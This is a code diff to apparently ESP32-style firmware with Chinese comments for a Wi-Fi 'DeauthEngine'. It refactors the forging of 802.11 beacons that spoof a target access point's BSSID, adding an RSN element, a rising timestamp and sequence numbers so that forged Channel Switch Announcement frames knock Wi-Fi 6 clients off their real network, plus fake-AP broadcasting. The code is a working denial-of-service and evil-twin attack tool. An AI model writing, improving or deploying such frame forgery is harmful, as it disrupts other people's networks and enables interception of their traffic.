@@ -360,7 +360,7 @@ struct DeauthEngine {
   // 下面两个标志仅作兜底: 若某构建仍被拒, 自动改用伪造 CSA 让客户端跟随切信道掉线。
   bool platformBlocked = false;
   bool csaMode = false;        // true = 用 CSA 信标/Action 替代被拒的 Deauth 帧
-  uint8_t csaBeacon[96];       // 伪造 CSA 信标 (BSSID 冒用目标 AP)
+  uint8_t csaBeacon[128];       // 伪造 CSA 信标 (BSSID 冒用目标 AP)
   uint16_t csaBeaconLen = 0;
   uint8_t csaAction[48];       // 伪造 Spectrum Management CSA Action 帧
   uint8_t csaActionLen = 0;
@@ -516,69 +516,73 @@ static bool isValidCloneChannel(int ch) {
 #endif
 }
 
-// 构建伪造信标帧 (802.11 管理帧 Subtype=8) —— 「假 AP」用: 跳频到该信道时广播,
-// 空口上真的能扫到这个 SSID。buffer 至少 120 字节, 返回实际帧长 (0 = BSSID 非法)。
-static uint16_t buildBeaconFrame(const String &ssidIn, const String &bssidIn, uint8_t channel, uint8_t *f) {
+// 构建合法信标帧 (802.11 管理帧 Subtype=8) —— 「假 AP」/CSA 共用。
+// 依据 PR #438 的真机经验, 下面三点缺一不可, 否则 Wi-Fi 6 客户端会整帧丢弃:
+//   1. Privacy 位置 1 时必须带标准 RSN IE (只置位不带 IE 的帧会被丢掉);
+//   2. TSF 与 Sequence Control 必须单调递增 (常量会被判为重复帧);
+//   3. Supported Rates 用标准 8 速率集, 不塞伪造的 HE 能力元素。
+// extraIe/extraLen 用于追加附加 IE (如 CSA)。buffer 至少 160 字节, 返回帧长 (0 = BSSID 非法)。
+static uint16_t buildBeaconFrameEx(const String &ssidIn, const String &bssidIn, uint8_t channel,
+                                   bool privacy, const uint8_t *extraIe, uint8_t extraLen, uint8_t *f) {
   uint8_t mac[6];
   String bssid = bssidIn;
   bssid.trim();
   if (!parseBssid(bssid, mac)) return 0;
   String ssid = ssidIn;
   if (ssid.length() > 32) ssid = ssid.substring(0, 32);
-  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
+  static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
+  static const uint8_t RSN_IE[22] = {
+      0x30, 0x14,                    // RSN IE (48), 长度 20
+      0x01, 0x00,                    // RSN Version 1
+      0x00, 0x0F, 0xAC, 0x04,        // Group cipher: CCMP
+      0x01, 0x00,                    // Pairwise cipher 数量 1
+      0x00, 0x0F, 0xAC, 0x04,        // Pairwise: CCMP
+      0x01, 0x00,                    // AKM 数量 1
+      0x00, 0x0F, 0xAC, 0x02,        // AKM: PSK (WPA2-Personal)
+      0x00, 0x00                     // RSN Capabilities: 无
+  };
+  static uint64_t tsf = 0;
+  static uint16_t seq = 0;
+  tsf += 100000;                                // 每帧 +100ms, 与 100 TU 信标间隔一致
+  seq = (uint16_t)((seq + 1) & 0x0FFF);         // 12 位序列号循环
   uint16_t i = 0;
-  f[i++] = 0x80; f[i++] = 0x00;              // Frame Control: 管理 / Beacon
-  f[i++] = 0x00; f[i++] = 0x00;              // Duration
-  memcpy(f + i, BROADCAST, 6); i += 6;       // Address 1: 广播
-  memcpy(f + i, mac, 6); i += 6;             // Address 2: BSSID (伪造)
-  memcpy(f + i, mac, 6); i += 6;             // Address 3: BSSID
-  f[i++] = 0x00; f[i++] = 0x00;              // Sequence Control
-  for (int k = 0; k < 8; k++) f[i++] = 0x00; // Timestamp
-  f[i++] = 0x64; f[i++] = 0x00;              // Beacon Interval (100 TU)
-  f[i++] = 0x01; f[i++] = 0x04;              // Capability: ESS + ShortSlot, 不加密
-  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();   // SSID IE
+  f[i++] = 0x80; f[i++] = 0x00;                 // Frame Control: 管理 / Beacon
+  f[i++] = 0x00; f[i++] = 0x00;                 // Duration
+  memcpy(f + i, BROADCAST, 6); i += 6;          // Address 1: 广播
+  memcpy(f + i, mac, 6); i += 6;                // Address 2: BSSID (伪造)
+  memcpy(f + i, mac, 6); i += 6;                // Address 3: BSSID
+  f[i++] = (uint8_t)((seq & 0x000F) << 4);      // Sequence Control 低 4 位
+  f[i++] = (uint8_t)(seq >> 4);                 //                  高 8 位
+  memcpy(f + i, &tsf, 8); i += 8;               // Timestamp (小端)
+  f[i++] = 0x64; f[i++] = 0x00;                 // Beacon Interval (100 TU)
+  f[i++] = privacy ? 0x11 : 0x01;               // Capability: ESS (+ Privacy)
+  f[i++] = 0x04;                                //   + ShortSlotTime
+  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();  // SSID IE
   for (size_t k = 0; k < ssid.length(); k++) f[i++] = (uint8_t)ssid[k];
-  f[i++] = 0x01; f[i++] = 0x08;              // Supported Rates IE
+  f[i++] = 0x01; f[i++] = 0x08;                 // Supported Rates IE
   for (int k = 0; k < 8; k++) f[i++] = RATES[k];
   // DS Parameter (信道): 仅 2.4G 信标携带; 5G 客户端按中心频率推信道, 带 DS IE 反而违规
   if (!isBand5G(channel)) {
     f[i++] = 0x03; f[i++] = 0x01; f[i++] = channel;
   }
+  if (privacy) { memcpy(f + i, RSN_IE, sizeof(RSN_IE)); i += sizeof(RSN_IE); }
+  if (extraIe && extraLen) { memcpy(f + i, extraIe, extraLen); i += extraLen; }
   return i;
+}
+
+static uint16_t buildBeaconFrame(const String &ssidIn, const String &bssidIn, uint8_t channel, uint8_t *f) {
+  return buildBeaconFrameEx(ssidIn, bssidIn, channel, false, nullptr, 0, f);
 }
 
 // ---- CSA (Channel Switch Announcement) 强制下线 (Deauth 被驱动拒绝时的兜底) ----
 // 用冒充目标 AP BSSID 的 CSA 帧让客户端"跟随 AP 切换信道"从而脱离真实网络。
-// 注意: Privacy 位已置却缺 RSN IE 的信标会被 Wi-Fi 6 客户端丢弃, 因此该兜底只对宽松客户端有效。
+// 信标本身按 WPA2 合法帧构造 (含 RSN IE 与单调 TSF/序列号), 否则 Wi-Fi 6 客户端整帧丢弃。
 static uint16_t buildCsaBeaconFrame(const String &ssidIn, const String &bssidIn,
                                    uint8_t curCh, uint8_t newCh, uint8_t *f) {
-  uint8_t mac[6];
-  String bssid = bssidIn;
-  bssid.trim();
-  if (!parseBssid(bssid, mac)) return 0;
-  String ssid = ssidIn;
-  if (ssid.length() > 32) ssid = ssid.substring(0, 32);
-  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
-  uint16_t i = 0;
-  f[i++] = 0x80; f[i++] = 0x00;              // Beacon
-  f[i++] = 0x00; f[i++] = 0x00;
-  memcpy(f + i, BROADCAST, 6); i += 6;
-  memcpy(f + i, mac, 6); i += 6;             // 冒用目标 AP
-  memcpy(f + i, mac, 6); i += 6;
-  f[i++] = 0x00; f[i++] = 0x00;
-  for (int k = 0; k < 8; k++) f[i++] = 0x00; // Timestamp
-  f[i++] = 0x64; f[i++] = 0x00;              // Beacon Interval
-  f[i++] = 0x31; f[i++] = 0x04;              // Capability: ESS+Privacy+ShortSlot (像 WPA2 AP)
-  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();
-  for (size_t k = 0; k < ssid.length(); k++) f[i++] = (uint8_t)ssid[k];
-  f[i++] = 0x01; f[i++] = 0x08;              // Supported Rates
-  for (int k = 0; k < 8; k++) f[i++] = RATES[k];
-  if (!isBand5G(curCh)) { f[i++] = 0x03; f[i++] = 0x01; f[i++] = curCh; }  // DS: 当前信道
-  f[i++] = 0x25; f[i++] = 0x03;              // CSA IE (37): mode=1, newCh, count=1
-  f[i++] = 0x01; f[i++] = newCh; f[i++] = 0x01;
-  return i;
+  // CSA IE (Element 37): mode=1, new channel, switch count=1
+  const uint8_t csaIe[5] = {0x25, 0x03, 0x01, newCh, 0x01};
+  return buildBeaconFrameEx(ssidIn, bssidIn, curCh, true, csaIe, sizeof(csaIe), f);
 }
 
 // Spectrum Management CSA Action 帧 (Category 0 / Action 4) —— 部分客户端只认 Action 形式
